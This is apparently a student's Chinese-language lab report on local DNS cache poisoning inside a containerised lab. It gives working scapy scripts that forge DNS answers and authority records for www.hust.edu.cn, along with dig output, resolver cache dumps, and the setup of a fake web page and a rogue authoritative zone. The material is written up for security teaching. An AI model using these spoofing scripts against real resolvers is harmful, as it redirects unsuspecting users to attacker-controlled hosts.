root@DNS_Server:/# rndc dumpdb -cache
root@DNS_Server:/# cat /var/cache/bind/dump.db
;
; Start view _default
;
;
; Cache dump of view '_default' (cache _default)
;
$DATE 20220430145132
; authanswer
.			11448	IN NS	ns.hust.edu.cn.
; authauthority
ns.hust.edu.cn.		11450	NS	ns.hust.edu.cn.
; additional
			11448	A	201.91.180.3
; authanswer
www.hust.edu.cn.	11450	A	172.18.0.1
; authanswer
e.root-servers.net.	604449	AAAA	2001:500:a8::e
; authanswer
g.root-servers.net.	604449	AAAA	2001:500:12::d0d
```

![1.4.14.查看DNS缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302304569.png)

<div style="page-break-after: always;"></div>

### 1.4.3 使用`scapy`进行攻击

#### 1.4.3.1 开启伪造的`HTTP`服务器

- 在攻击前，在攻击机`172.18.0.1`安装`go`运行环境，并且使用程序`main.go`开启`HTTP`服务器，返回伪造的页面`Fake.html`，二者见`CODES/FakeHtmlServer`。
- 使用`go run main.go`运行该`HTTP`服务器，使用浏览器访问如下：

![1.4.15.伪造的HTTP服务](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011349496.png)

#### 1.4.3.2 攻击过程

- 攻击程序`local_dns_poisoning_attack.py`如下：
  - 伪造针对的域名：`www.hust.edu.cn`；
  - 伪造的域名对应`IP`：`172.18.0.1`（攻击机的`IP`，即将对`www.hust.edu.cn`的访问重定向到攻击机）；
  - 伪造的权威域名服务器：`ns1.hust.edu.cn`、`ns2.hust.edu.cn`；
  - 伪造的权威域名服务器对应的`IP`：`201.91.180.3`（由学号变化而来）、`200.10.3.27`（由生日变化而来）；
  - `TTL`均为学号后`5`位：`11803`；
  - 使用`filter`过滤`DNS`服务器向外界的`DNS`请求；
  - 嗅探的网卡为`172.18.0.1/24`对应的网卡`br-e4a075733e38`。

```python
#!/usr/bin/python3

from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # The Authority Section
        NSsec1 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns1.hust.edu.cn')
        NSsec2 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns2.hust.edu.cn')

        # The Additional Section
        Addsec1 = DNSRR(rrname='ns1.hust.edu.cn', type='A', 
        	ttl=11803, rdata='201.91.180.3')
        Addsec2 = DNSRR(rrname='ns2.hust.edu.cn', type='A', 
        	ttl=11803, rdata='200.10.3.27')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, 
        	rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, 
        	an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        ls(DNSpkt)
        send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53 and src host 172.18.0.3'
pkt = sniff(iface='br-e4a075733e38', filter=f, prn=spoof_dns)
```

- `DNS`载荷的[说明](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS)如下：

| **length**  | [`ShortField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.ShortField) (Cond) | `None`      | [含义](http://c.biancheng.net/view/6457.html)             |
| ----------- | ------------------------------------------------------------ | ----------- | --------------------------------------------------------- |
| **id**      | [`ShortField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.ShortField) | `0`         | 传输`id`，需要与`DNS`请求报文一致                         |
| **qr**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 查询/响应标志（`0-查询，1-响应`）                         |
| **opcode**  | [`BitEnumField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitEnumField) | `0`         | 操作码（`0-标准查询，1-反向查询，2-服务器状态请求`）      |
| **aa**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 是否包含授权回答（`1-包含`）                              |
| **tc**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 是否被截断（`1-被截断`）                                  |
| **rd**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `1`         | 是否期望递归（`0-禁用递归查询`）                          |
| **ra**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 是否可用递归（`1-服务器支持递归查询`）                    |
| **z**       | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 保留字段                                                  |
| **ad**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 保留字段                                                  |
| **cd**      | [`BitField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitField) (1 bit) | `0`         | 保留字段                                                  |
| **rcode**   | [`BitEnumField`](https://scapy.readthedocs.io/en/latest/api/scapy.fields.html#scapy.fields.BitEnumField) | `0`         | 返回码（`0-无错误，1-报文格式错误，2-域名服务器失败...`） |
| **qdcount** | [`DNSRRCountField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRCountField) | `None`      | 查询域数量                                                |
| **ancount** | [`DNSRRCountField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRCountField) | `None`      | `answer`部分记录数量                                      |
| **nscount** | [`DNSRRCountField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRCountField) | `None`      | 授权部分记录数量                                          |
| **arcount** | [`DNSRRCountField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRCountField) | `None`      | 附加部分记录数量                                          |
| **qd**      | [`DNSQRField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSQRField) | `<DNSQR |>` | 查询域，需要与`DNS`请求报文一致                           |
| **an**      | [`DNSRRField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRField) | `None`      | `answer`部分                                              |
| **ns**      | [`DNSRRField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRField) | `None`      | 授权部分                                                  |
| **ar**      | [`DNSRRField`](https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html?highlight=DNS#scapy.layers.dns.DNSRRField) | `None`      | 附加部分                                                  |

- 清除`DNS`服务器的缓存后，在攻击机开启`HTTP`服务器并运行攻击程序，之后在客户机使用`dig www.hust.edu.cn`进行`DNS`查询，可以观察到立即得到了伪造的信息：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5573
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	11803	IN	A	172.18.0.1

;; AUTHORITY SECTION:
hust.edu.cn.		11803	IN	NS	ns1.hust.edu.cn.
hust.edu.cn.		11803	IN	NS	ns2.hust.edu.cn.

;; ADDITIONAL SECTION:
ns1.hust.edu.cn.	11803	IN	A	201.91.180.3
ns2.hust.edu.cn.	11803	IN	A	200.10.3.27

;; Query time: 81 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sun May 01 14:22:47 CST 2022
;; MSG SIZE  rcvd: 128
```

![1.4.16.第一次dig](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011433539.png)

- 攻击机运行的命令及输出如下：

```shell
## terminal 1
[05/01/22]seed@VM:~/.../FakeHtmlServer$ sudo go run main.go

## terminal 2
[05/01/22]seed@VM:~/.../FakeHtmlServer$ sudo ../local_dns_poisoning_attack.py 
length     : ShortField (Cond)                   = None            ('None')
id         : ShortField                          = 19833           ('0')
qr         : BitField  (1 bit)                   = 1               ('0')
opcode     : BitEnumField                        = 0               ('0')
aa         : BitField  (1 bit)                   = 1               ('0')
tc         : BitField  (1 bit)                   = 0               ('0')
rd         : BitField  (1 bit)                   = 0               ('1')
ra         : BitField  (1 bit)                   = 0               ('0')
z          : BitField  (1 bit)                   = 0               ('0')
ad         : BitField  (1 bit)                   = 0               ('0')
cd         : BitField  (1 bit)                   = 0               ('0')
rcode      : BitEnumField                        = 0               ('0')
qdcount    : DNSRRCountField                     = 1               ('None')
ancount    : DNSRRCountField                     = 1               ('None')
nscount    : DNSRRCountField                     = 2               ('None')
arcount    : DNSRRCountField                     = 2               ('None')
qd         : DNSQRField                          = <DNSQR  qname='www.hust.edu.cn.' qtype=A qclass=IN |> ('None')
an         : DNSRRField                          = <DNSRR  rrname='www.hust.edu.cn.' type=A ttl=11803 rdata=172.18.0.1 |> ('None')
ns         : DNSRRField                          = <DNSRR  rrname='hust.edu.cn' type=NS ttl=11803 rdata='ns1.hust.edu.cn' |<DNSRR  rrname='hust.edu.cn' type=NS ttl=11803 rdata='ns2.hust.edu.cn' |>> ('None')
ar         : DNSRRField                          = <DNSRR  rrname='ns1.hust.edu.cn' type=A ttl=11803 rdata=201.91.180.3 |<DNSRR  rrname='ns2.hust.edu.cn' type=A ttl=11803 rdata=200.10.3.27 |>> ('None')
.
Sent 1 packets.
```

- 此时关闭攻击程序，再次在客户机使用`dig www.hust.edu.cn`进行`DNS`查询，结果依然为攻击者伪造的信息，且`TTL`相应地减小：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49458
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	11735	IN	A	172.18.0.1

;; AUTHORITY SECTION:
hust.edu.cn.		11735	IN	NS	ns1.hust.edu.cn.
hust.edu.cn.		11735	IN	NS	ns2.hust.edu.cn.

;; ADDITIONAL SECTION:
ns1.hust.edu.cn.	11735	IN	A	201.91.180.3
ns2.hust.edu.cn.	11735	IN	A	200.10.3.27

;; Query time: 0 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sun May 01 14:23:55 CST 2022
;; MSG SIZE  rcvd: 128
```

![1.4.17.第二次dig](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011433432.png)

- 接下来将`DNS`服务器的缓存转储下来并查看（见`dump_scapy.db`），部分内容如下，由`9 ~ 18`行的条目可见针对`DNS`服务器的`DNS`缓存中毒攻击成功：

```shell
root@DNS_Server:/# rndc dumpdb -cache
root@DNS_Server:/# cat /var/cache/bind/dump.db
;
; Start view _default
;
;
; Cache dump of view '_default' (cache _default)
;
$DATE 20220501062430
; authauthority
hust.edu.cn.		11700	IN NS	ns1.hust.edu.cn.
			11700	IN NS	ns2.hust.edu.cn.
; additional
ns1.hust.edu.cn.	11700	A	201.91.180.3
; additional
ns2.hust.edu.cn.	11700	A	200.10.3.27
; authanswer
www.hust.edu.cn.	11700	A	172.18.0.1
; authanswer
e.root-servers.net.	604704	AAAA	2001:500:a8::e
```

![1.4.18.DNS缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011433632.png)

#### 1.4.3.3 攻击结果测试

- 在客户机使用`curl www.hust.edu.cn | tail -9`请求该页面，结果如下，被正确的导向了伪造的页面：

```shell
root@DNS_User:/# curl www.hust.edu.cn | tail -9
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1415  100  1415    0     0    132      0  0:00:10  0:00:10 --:--:--   350

<body>
    <div>
        <h1>Fake Example Domain - XuBiang</h1>
        <p>Your HOSTS or DNS has been changed to wrong ip address.</p>
    </div>
</body>

</html>
```

![1.4.19.被定向到伪造的网站](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011435451.png)

- 以上攻击过程中使用`Wireshark`获得的数据包见`1.4.7-使用Scapy进行DNS缓存中毒攻击.pcapng`，以下为`scapy`发送的伪造`DNS`响应：

![1.4.20.伪造数据包](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011435041.png)

## 1.5 `DNS`缓存中毒：针对授权区域部分

### 1.5.1 攻击原理

在上一个任务中，我们的`DNS`缓存中毒攻击仅影响一个主机名，即`www.hust.edu.cn`。 如果用户试图获取另一个主机名的`IP`地址，例如`mail.hust.edu.cn`，我们需要再次发起攻击。 如果我们发起一次可能影响整个`hust.edu.cn`域的攻击，效率会更高。我们的想法是使用`DNS`回复中的授权区域部分。当我们欺骗回复时，除了欺骗答案（在`Answer`部分），我们还在授权区域部分添加以下内容。当此条目由本地`DNS`服务器缓存时，`ns1.hust.edu.cn`和`ns2.hust.edu.cn`将用作名称服务器，以便将来查询`hust.edu.cn`域中的任何主机名。由于`ns1.hust.edu.cn`和`ns2.hust.edu.cn`是由攻击者控制的计算机，因此它可以为任何查询提供伪造答案。

```
;; AUTHORITY SECTION: 
hust.edu.cn.		11700	IN NS	ns1.hust.edu.cn.
					11700	IN NS	ns2.hust.edu.cn.
```

此任务的目的就是进行这样的攻击。你需要证明你可以获得本地`DNS`服务器缓存的上述条目。缓存中毒后，在`hust.edu.cn`域中的任何主机名上运行`dig`命令，并使用`Wireshark`观察`DNS`查询的位置。

### 1.5.2 使用之前的攻击程序

- 事实上，在`1.4.3 使用scapy进行DNS缓存中毒攻击`中，就已经对授权区域部分做出了欺骗，并且也对附加区域做出了欺骗。在缓存中毒攻击成功后，在客户机使用`dig mail.hust.edu.cn`进行查询，使用`Wireshark`获得的数据包见`1.5.1-测试之前的欺骗结果.pcapng`，可以发现即使对授权区域和附加区域都做出了欺骗（上图，数据包`8`），但`DNS`服务器仍然需要查询权威域名服务器`ns1.hust.edu.cn`和`ns2.hust.edu.cn`的`IP`，而不是使用附加区域的`IP`（下图，数据包`39、40`）：

![1.5.1.回复的伪造报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011948403.png)

![1.5.2.仍然要询问](https://raw.githubusercontent.com/BIIIANG/pic/main/202205011949524.png)

### 1.5.3 改进后的攻击

- 根据使用之前的攻击程序遇到的问题，仅仅在`DNS`响应的授权部分加入伪造的域名服务器并且在附加部分加入对应`IP`是不够的，若查询该域中的其他域名，仍然会重新询问域名服务器对应的`IP`，在附加部分的`IP`是没有生效的，因此需要对后续询问域名服务器的`IP`的`DNS`请求继续伪造响应，在响应的`Answer`部分填入伪造的域名服务器的`IP`，即攻击者的域名服务器的`IP`，才能将在指定域中的`DNS`请求全部定向到攻击者的域名服务器。因此对上述程序进行修改，得到程序：
  - 注：其中域名服务器`ns1.hust.edu.cn`对应的`IP`修改成了`172.18.0.1`，以便于后续的继续攻击；`ns2.hust.edu.cn`对应的`IP`不变，由于是一个不存在的`IP`，因而不会返回结果。

```python
#!/usr/bin/python3

from scapy.all import *

def spoof_dns(pkt):
    # Only filter the A query
    if (DNS not in pkt or pkt[DNS].qd.qtype != 1):
    	return

    # Swap the source and destination IP address and port number
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    if ('www.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # The Authority Section
        NSsec1 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns1.hust.edu.cn')
        NSsec2 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns2.hust.edu.cn')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, 
        	rd=0, qr=1, qdcount=1, ancount=1, nscount=2, 
            arcount=0, an=Anssec, ns=NSsec1/NSsec2)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
    elif ('ns1.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, rd=0, 
        	qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
    elif ('ns2.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='200.10.3.27')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, rd=0, 
        	qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53 and src host 172.18.0.3'
pkt = sniff(iface='br-e4a075733e38', filter=f, prn=spoof_dns)
```

- 使用该程序进行攻击，用户机进行`dig www.hust.edu.cn`操作时，攻击机返回`www.hust.edu.cn`对应的`IP`为`172.18.0.1`，并在授权部分说明两个权威域名服务器`ns1.hust.edu.cn`和`ns2.hust.edu.cn`，由于附加部分不生效，因此将附加部分删除；当用户机进行`dig mail.hust.edu.cn`时，`DNS`服务器将会询问两个权威域名服务器对应的`IP`，此时攻击机再次进行欺骗，服务器接收到错误的响应后便会向两个错误的域名服务器发送`mail.hust.edu.cn`的`DNS`询问。由于`ns1.hust.edu.cn`对应的`IP:172.18.0.1`此时没有相关信息且`ns2.hust.edu.cn`对应的`IP:200.10.3.27`为不存在的`IP`，因此查询将失败。
- 攻击过程见`1.5.2-针对授权区域部分(未开启伪造域名服务器).pcapng`，第一次欺骗如下：

![1.5.3.第一次欺骗](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012017287.png)

- 后续欺骗如下，数据包`40`为`DNS`服务器查询`ns1.hust.edu.cn`的`IP`，数据包`45`为伪造的该询问的响应，告诉服务器对应的`IP`为`172.18.0.1`，服务器得到该信息后便继续向`172.18.0.1`查询`mail.hust.edu.cn`的`IP`，即数据包`46`；数据包`42、48、49`同理，是对`ns2.hust.edu.cn`的询问：

![1.5.4.第二次欺骗](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012018247.png)

### 1.5.4 建立伪造的权威域名服务器

- 为了最终完成攻击，在攻击机`172.18.0.1`上运行伪造的权威域名服务器`ns1.hust.edu.cn`，因此为攻击机上的`bind9`添加相应的域（参考`0.4 在本地DNS服务器中建一个区域`），将以下内容添加到攻击机的`/etc/bind/named.conf.default-zones`中：

```
zone "hust.edu.cn" { 
	type master; 
	file "/etc/bind/hust.edu.cn.db"; 
};
```

- 正向查找文件见`hust.edu.cn.db`，将其放置在`/etc/bind`，并配置响应读权限，此处不再赘述。

### 1.5.5 完整的攻击

- 建立以上伪造的权威域名服务器后，重启攻击机的`bind9`服务。
- 在攻击机使用程序`local_dns_poisoning_attack_auth.py`进行攻击，客户机先`dig www.hust.edu.cn`，然后`dig mail.hust.edu.cn`，再`dig cse.hust.edu.cn`，结果如下所示，可见可以对该域中的所有域名实现欺骗：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26837
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	11803	IN	A	172.18.0.1

;; AUTHORITY SECTION:
hust.edu.cn.		11803	IN	NS	ns1.hust.edu.cn.
hust.edu.cn.		11803	IN	NS	ns2.hust.edu.cn.

;; Query time: 61 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sun May 01 20:34:58 CST 2022
;; MSG SIZE  rcvd: 96

root@DNS_User:/# dig mail.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> mail.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34959
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;mail.hust.edu.cn.		IN	A

;; ANSWER SECTION:
mail.hust.edu.cn.	259200	IN	A	192.168.0.102

;; AUTHORITY SECTION:
hust.edu.cn.		11788	IN	NS	ns2.hust.edu.cn.
hust.edu.cn.		11788	IN	NS	ns1.hust.edu.cn.

;; ADDITIONAL SECTION:
ns1.hust.edu.cn.	11802	IN	A	172.18.0.1
ns2.hust.edu.cn.	11802	IN	A	200.10.3.27

;; Query time: 829 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sun May 01 20:35:13 CST 2022
;; MSG SIZE  rcvd: 129

root@DNS_User:/# dig cse.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> cse.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36232
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cse.hust.edu.cn.		IN	A

;; ANSWER SECTION:
cse.hust.edu.cn.	259200	IN	A	192.168.0.100

;; AUTHORITY SECTION:
hust.edu.cn.		11561	IN	NS	ns.hust.edu.cn.

;; ADDITIONAL SECTION:
ns.hust.edu.cn.		259200	IN	A	192.168.0.10

;; Query time: 4 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sun May 01 20:39:00 CST 2022
;; MSG SIZE  rcvd: 93
```

![1.5.5](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012206305.png)

![1.5.6](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012206580.png)

![1.5.7](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012206998.png)

- 转储并查看服务器的`DNS`缓存如下（部分）：

```shell
root@DNS_Server:/# rndc dumpdb -cache
root@DNS_Server:/# cat /var/cache/bind/dump.db
;
; Start view _default
;
;
; Cache dump of view '_default' (cache _default)
;
$DATE 20220501124231
; authauthority
hust.edu.cn.		11350	IN NS	ns.hust.edu.cn.
; authanswer
cse.hust.edu.cn.	258989	A	192.168.0.100
; authanswer
mail.hust.edu.cn.	258762	A	192.168.0.102
; additional
ns.hust.edu.cn.		258989	A	192.168.0.10
; answer
ns1.hust.edu.cn.	11364	A	172.18.0.1
; answer
ns2.hust.edu.cn.	11364	A	200.10.3.27
; authanswer
www.hust.edu.cn.	11350	A	172.18.0.1
```

![1.5.8.DNS缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012204968.png)

- 使用`Wireshark`获得的数据包见`1.5.3-针对授权区域部分(开启伪造域名服务器).pcapng`，不再赘述。

## 1.6 `DNS`缓存中毒：针对另一个域

### 1.6.1 攻击原理

在上一次攻击中，我们成功使本地`DNS`服务器缓存中毒，因此`ns1.hust.edu.cn`和`ns2.hust.edu.cn`成为`hust.edu.cn`域的名称服务器。受到这一成功的启发，我们希望将其影响扩展到其他域。也就是说，在由`www.hust.edu.cn`查询触发的欺骗性响应中，我们希望在 授权部分添加其他条目，使得`ns1.hust.edu.cn`也可用作`google.com`的名称服务器。

### 1.6.2 攻击过程

- 攻击程序仅在`local_dns_poisoning_attack_auth.py`的基础上作出一处修改，即在`www.hust.edu.cn`的伪造响应中添加一条授权记录，得到`local_dns_poisoning_attack_another_domain.py`：

```python
#!/usr/bin/python3

from scapy.all import *

def spoof_dns(pkt):
    # Only filter the A query
    if (DNS not in pkt or pkt[DNS].qd.qtype != 1):
    	return

    # Swap the source and destination IP address and port number
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    if ('www.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # The Authority Section
        NSsec1 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns1.hust.edu.cn')
        NSsec2 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns2.hust.edu.cn')
        NSsec3 = DNSRR(rrname='google.com', type='NS', 
            ttl=11803, rdata='ns1.hust.edu.cn')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, 
        	rd=0, qr=1, qdcount=1, ancount=1, nscount=3, 
            arcount=0, an=Anssec, ns=NSsec1/NSsec2/NSsec3)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
    elif ('ns1.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, rd=0, 
        	qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
    elif ('ns2.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='200.10.3.27')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, rd=0, 
        	qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53 and src host 172.18.0.3'
pkt = sniff(iface='br-e4a075733e38', filter=f, prn=spoof_dns)

```

- 清空`DNS`服务器的缓存后，在攻击机运行该程序进行攻击，在客户机使用`dig www.hust.edu.cn`进行请求。
- 转储并查看服务器的`DNS`缓存（见`dump_another_domain.db`），没有`google.com`对应的缓存：

```shell
root@DNS_Server:/# rndc dumpdb -cache
root@DNS_Server:/# cat /var/cache/bind/dump.db              
;
; Start view _default
;
;
; Cache dump of view '_default' (cache _default)
;
$DATE 20220501131432
; authauthority
hust.edu.cn.		11603	IN NS	ns1.hust.edu.cn.
			11603	IN NS	ns2.hust.edu.cn.
; authanswer
www.hust.edu.cn.	11603	A	172.18.0.1

```

![1.6.2.没有google.com对应的缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012124749.png)

- 攻击过程获得的数据包见`1.6.1-针对另一个域.pcapng`，可见欺骗报文的确包含`google.com`对应的授权条目，因此推测该条目被服务器忽略了：

![1.6.3.攻击发送了google.com](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012127366.png)

### 1.6.3 结果分析

- 猜想攻击未生效的原因：攻击程序在授权部分放入了三条`NS`记录，其中两条是`hust.edu.cn`域的，另一条是`google.com`域的，两个域都指明`ns1.hust.edu.cn`或`ns2.hust.edu.cn`是它们的权威域名服务器。前两条记录是合法的，因此会被缓存；而`google.com`域的记录是伪造的，若该记录被接受，则`ns1.hust.edu.cn`就成为了`google.com`的权威域名服务器，从而掌管`google.com`域，这显然是不安全的，因此`DNS`服务器没有接受`google.com`的记录。这可能是通过与`Query/Answer`条目进行比对来决定的。

## 1.7 `DNS`缓存中毒：针对附加部分

### 1.7.1 攻击原理

在`DNS`回复中，有一个名为`Additional Section`的部分，用于提供其他信息。实际上，它主要用于为某些主机名提供`IP`地址，特别是对于出现在`Authority section`部分的主机名。 此任务的目标是在附加部分添加某些欺骗条目，并查看它们是否由目标本地`DNS`服务器成功缓存。特别地，在响应`www.hust.edu.cn`的查询时，除了`Answer`部分中的条目外，我们还在欺骗回复中添加以下条目：

```
